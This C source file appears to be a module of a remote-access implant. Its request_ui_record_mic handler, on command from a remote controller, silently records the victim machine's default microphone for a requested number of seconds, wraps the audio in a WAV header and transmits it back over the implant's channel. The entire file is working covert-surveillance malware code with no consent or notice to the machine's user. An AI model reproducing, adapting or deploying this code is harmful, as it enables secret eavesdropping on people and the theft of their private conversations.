#pragma comment(lib, "Winmm.lib")
#include "precomp.h"
#include <windows.h>
#include "../../common/common.h"
#include "audio.h"

//Handle used for synchronization. Main thread waits for event to be signalled to clean up
HANDLE recordMicEvent;

//All these default values should be overwritten
UINT buffersize = 0;
UINT riffsize = 0;
PBYTE recordBuffer = NULL;
PBYTE sendBuffer = NULL;
PBYTE dataBuffer = NULL;

//Callback saves data
void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
	DWORD_PTR dwParam1, DWORD_PTR dwParam2)
{
	if (uMsg == WIM_DATA) {
		memcpy(dataBuffer, recordBuffer, buffersize);
		SetEvent(recordMicEvent);
	}
}

/*
 * Record from default audio device for X seconds.
 */
DWORD request_ui_record_mic(Remote * remote, Packet * request)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet *response = NULL;
	HANDLE procHeap = GetProcessHeap();
	UINT seconds;
	DWORD chunkSize;
	DWORD subChunk1Size;
	WAVEFORMATEX wavFormat;
	WAVEFORMATEX wf;
	HWAVEIN hWavIn;
	WAVEHDR wh;

	response = packet_create_response(request);

	if (!response) {
		dprintf("request_ui_record_mic: packet_create_response failed");
		dwResult = ERROR_INVALID_HANDLE;
		goto out;
	}

	/*
	 * Get duration to record, and reallocate if necessary
	 */
	seconds = packet_get_tlv_value_uint(request, TLV_TYPE_AUDIO_DURATION);
	if (buffersize == 0 || buffersize != 11025 * seconds) {
		buffersize = 11025 * seconds;
		riffsize = buffersize + 44;

		if (recordBuffer != NULL) {
			HeapFree(procHeap, 0, recordBuffer);
		}
		recordBuffer = HeapAlloc(procHeap, HEAP_ZERO_MEMORY, buffersize);

		if (sendBuffer != NULL) {
			HeapFree(procHeap, 0, sendBuffer);
		}
		sendBuffer = HeapAlloc(procHeap, HEAP_ZERO_MEMORY, riffsize);

		if (recordBuffer == NULL || sendBuffer == NULL) {
			dprintf("request_ui_record_mic: Allocation failed");
			dwResult = GetLastError();
			goto out;
		}
		dataBuffer = sendBuffer + 44;
	}

	/*
	 * Create file header
	 */
	memcpy(sendBuffer, "RIFF", 4);
	chunkSize = buffersize + 36;
	memcpy(sendBuffer + 4, &chunkSize, 4);
	memcpy(sendBuffer + 8, "WAVE", 4);

	/*
	 * Subchunk1
	 */
	memcpy(sendBuffer + 12, "fmt ", 4);
	subChunk1Size = 16;
	memcpy(sendBuffer + 16, &subChunk1Size, 4);
	wavFormat.wFormatTag = 1;
	wavFormat.nChannels = 1;
	wavFormat.nSamplesPerSec = 11025;
	wavFormat.nAvgBytesPerSec = 11025;
	wavFormat.nBlockAlign = 1;
	wavFormat.wBitsPerSample = 8;
	memcpy(sendBuffer + 20, &wavFormat, 16);

	/*
	 * Subchunk 2
	 */
	memcpy(sendBuffer + 36, "data", 4);
	memcpy(sendBuffer + 40, &buffersize, 4);

	/*
	 * Set up WAVEFORMATEX for recording 11 kHz 8-bit mono. Not reusing
	 * wavFormat because this uses the cbSize member
	 */
	wf.wFormatTag = WAVE_FORMAT_PCM;
	wf.nChannels = 1;
	wf.nSamplesPerSec = 11025L;
	wf.nAvgBytesPerSec = 11025L;
	wf.nBlockAlign = 1;
	wf.wBitsPerSample = 8;
	wf.cbSize = 0;
	dwResult = waveInOpen(&hWavIn, WAVE_MAPPER, &wf, (DWORD_PTR)waveInProc,
		(DWORD_PTR)NULL, CALLBACK_FUNCTION);
	if (dwResult != MMSYSERR_NOERROR) {
		dprintf("request_ui_record_mic: WaveInOpen failed");
		goto out;
	}

	wh.lpData = (LPSTR) recordBuffer;
	wh.dwBufferLength = buffersize;
	wh.dwFlags = 0;
	waveInPrepareHeader(hWavIn, &wh, sizeof(wh));
	waveInAddBuffer(hWavIn, &wh, sizeof(wh));

	recordMicEvent = CreateEvent(NULL,	// default security attributes
		FALSE,				// auto-reset event
		FALSE,				// initial state is nonsignaled
		NULL);				// no object name

	dwResult = (DWORD) waveInStart(hWavIn);
	if (dwResult != MMSYSERR_NOERROR) {
		dprintf("request_ui_record_mic: WaveInStart failed");
		goto out;
	}

	WaitForSingleObject(recordMicEvent, seconds * 1000 + 1000);
	dwResult = (DWORD) waveInStop(hWavIn);	//seems to wait for buffer to complete
	if (dwResult != MMSYSERR_NOERROR) {
		dprintf("request_ui_record_mic: WaveInStop failed");
		goto out;
	}

	packet_add_tlv_raw(response,
		(TLV_TYPE_AUDIO_DATA | TLV_META_TYPE_COMPRESSED), sendBuffer, riffsize);
out:
	packet_transmit_response(dwResult, remote, response);
	return ERROR_SUCCESS;
}
